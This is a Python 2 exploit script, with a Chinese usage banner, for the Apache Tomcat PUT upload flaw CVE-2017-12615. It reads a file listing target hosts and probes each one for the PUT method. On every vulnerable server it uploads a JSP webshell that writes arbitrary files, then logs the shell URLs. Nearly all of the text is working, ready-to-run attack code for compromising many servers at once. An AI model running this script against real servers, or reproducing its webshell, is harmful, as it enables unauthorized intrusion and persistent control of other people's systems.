#! -*- coding:utf-8 -*- 
import httplib
import sys
import time,codecs
UrlFile=file('./tomcat1.txt') #url列表
fp= codecs.open("./tomcat_success.txt","a") #成功利用后写入的文件，支持写入中文字符的方式
body = '''<%@ page language="java" pageEncoding="gbk"%><jsp:directive.page import="java.io.File"/><jsp:directive.page import="java.io.OutputStream"/><jsp:directive.page import="java.io.FileOutputStream"/><% int i=0;String method=request.getParameter("act");if(method!=null&&method.equals("yoco")){String url=request.getParameter("url");String text=request.getParameter("smart");File f=new File(url);if(f.exists()){f.delete();}try{OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();}catch(Exception e){i++;%>0<%}}if(i==0){%>1<%}%><form action='?act=yoco' method='post'><input size="100" value="<%=application.getRealPath("/") %>" name="url"><br><textarea rows="20" cols="80" name="smart">'''

if __name__ == "__main__":
    try:
       print '''
       ----------------------------------------------------------------------------------------
        程序名称：tomcat put上传漏洞利用程序v1.1,tomcat_put.py
        漏洞编号：CVE-2017-12615
        影响平台：Windows&Linux
        影响版本：Apache Tomcat 7.0.0 - 7.0.81
        程序用法：
       \ttomcat1.txt里面设置需要扫描的IP地址，如:10.110.123.30:8080 回车后输入下一个IP地址
       \tpython tomcat_put.py
       \t上传成功的结果会自动存入当前目录下的tomcat_success.txt文件!
       \t成功会自动部署webshell,http://10.110.123.30:8080/test11.jsp
       -----------------------------------------------------------------------------------------\n'''
       urllist=[]
       print "\ttomcat url list:",
       while True:
          line = UrlFile.readline()
          if len(line) == 0: # Zero length indicates EOF
             break
             #exit()             
          line=line.strip()
          print line,
          urllist.append(line)
       UrlFile.close()
       print '\n'
       for i in urllist:
          conn = httplib.HTTPConnection(i)
          conn.request(method='OPTIONS', url='/ffffzz')
          headers = dict(conn.getresponse().getheaders())
          if 'allow' in headers and \
             headers['allow'].find('PUT') > 0 :
             conn.close()
             conn = httplib.HTTPConnection(i)
             url = "/" + "test11"+'.jsp/'
             #url = "/" + str(int(time.time()))+'.jsp::$DATA'
             conn.request( method='PUT', url= url, body=body)
             res = conn.getresponse()
             if res.status  == 201 :
                #print 'shell:', 'http://' + sys.argv[1] + url[:-7]
                info='\t[*]shell:'+'http://' +i + url[:-1]+"\n"
                print info
                fp.write(info)
                fp.flush()
             elif res.status == 204 :
                info='http://' +i + url[:-1]
                print '[*]file exists! %s' %info
             else:
                print '\t[*]error!'
             conn.close()
          else:  
             print '\t[*]server not vulnerable!'
        
    except Exception,e:
       print '\tError:', e